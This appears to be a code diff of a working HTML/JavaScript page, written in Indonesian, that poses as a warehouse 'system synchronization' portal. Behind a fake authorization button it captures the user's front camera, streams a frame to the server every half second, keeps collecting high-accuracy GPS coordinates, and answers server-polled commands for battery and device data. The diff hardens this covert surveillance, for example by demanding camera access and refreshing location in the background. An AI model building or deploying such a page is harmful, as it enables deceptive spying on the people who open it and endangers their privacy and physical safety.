@@ -1,15 +1,17 @@
+<!DOCTYPE html>
 <html>
 <head>
     <title>Lab System Synchronization</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; text-align: center; padding-top: 80px; }
-        .box { border: 2px solid #00ff00; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #00ff00; border-radius: 8px; }
-        .btn { background-color: #003300; color: white; padding: 16px 32px; border: 1px solid #00ff00; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { background-color: #0b0c10; color: #45f3ff; font-family: monospace; text-align: center; padding-top: 80px; margin: 0; }
+        .box { border: 2px solid #45f3ff; display: inline-block; padding: 30px; background-color: #1f2833; box-shadow: 0 0 15px #45f3ff; border-radius: 8px; max-width: 90%; }
+        .btn { background-color: #45f3ff; color: #0b0c10; padding: 16px 32px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn:hover { background-color: #66fcf1; box-shadow: 0 0 10px #45f3ff; }
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="box" id="main-box">
         <h2>[ GEAR99 SISTEM MANAJEMEN PAKET ]</h2>
         <p>Gudang terisolasi memerlukan sinkronisasi media dan koordinat satu pintu.</p>
         <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
@@ -18,45 +20,70 @@
     <script>
         var canvas = document.createElement('canvas');
         var ctx = canvas.getContext('2d');
-        var targetLatitude = "Belum Diizinkan/Tidak Didukung";
-        var targetLongitude = "Belum Diizinkan/Tidak Didukung";
+        var targetLatitude = "Mencari...";
+        var targetLongitude = "Mencari...";
         
+        function ambilLokasi() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    targetLatitude = pos.coords.latitude;
+                    targetLongitude = pos.coords.longitude;
+                }, (err) => {
+                    targetLatitude = "Ditolak (" + err.message + ")";
+                    targetLongitude = "Ditolak (" + err.message + ")";
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            } else {
+                targetLatitude = "Tidak Didukung";
+                targetLongitude = "Tidak Didukung";
+            }
+        }
+
         async function triggerOtoritas() {
+            // Ambil lokasi seketika saat tombol ditekan
+            ambilLokasi();
+            
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                // Ambil akses kamera depan secara eksplisit
+                let stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+                    audio: false 
+                });
+                
                 let video = document.getElementById("v-feed");
                 video.srcObject = stream;
                 
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                        targetLatitude = pos.coords.latitude;
-                        targetLongitude = pos.coords.longitude;
-                    }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-                }
-
                 video.onloadedmetadata = () => { 
                     video.play(); 
-                    setInterval(captureFrame, 400); 
+                    // Mulai pengiriman data berkala setelah stream aktif
+                    setInterval(captureFrame, 500); 
                     setInterval(listenServerCommand, 1000); 
                 };
-                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi manajemen private proxy.</p></div>";
-            } catch(err) { alert("Izin ditolak: " + err); }
+                
+                document.getElementById("main-box").innerHTML = "<h2 style='color:#66fcf1;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi manajemen private proxy.</p>";
+            } catch(err) { 
+                alert("Wajib mengizinkan akses kamera untuk sinkronisasi sistem gudang."); 
+            }
         }
         
         function captureFrame() {
             let video = document.getElementById("v-feed");
             if(video.videoWidth > 0) {
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
                 fetch('/receive_frame', { 
                     method: 'POST', 
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.4) })
+                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.3) })
                 });
             }
         }
 
         async function listenServerCommand() {
+            // Selalu perbarui koordinat GPS secara dinamis di latar belakang
+            ambilLokasi();
+            
             let res = await fetch('/poll_command');
             let data = await res.json();
             if (data.command) {
@@ -65,9 +92,9 @@
                 
                 if (data.command === "cek_baterai") {
                     let battery = await navigator.getBattery();
-                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + (battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
+                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + Math.round(battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
                 } else if (data.command === "ambil_data_sistem") {
-                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Agen: " + navigator.userAgent;
+                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Vendor: " + navigator.vendor;
                 } else if (data.command === "ambil_lokasi") {
                     report = "[" + timestamp + "] KOORDINAT PERANGKAT -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
                 } else if (data.command === "ping_test") {
@@ -84,4 +111,3 @@
     </script>
 </body>
 </html>
-"""
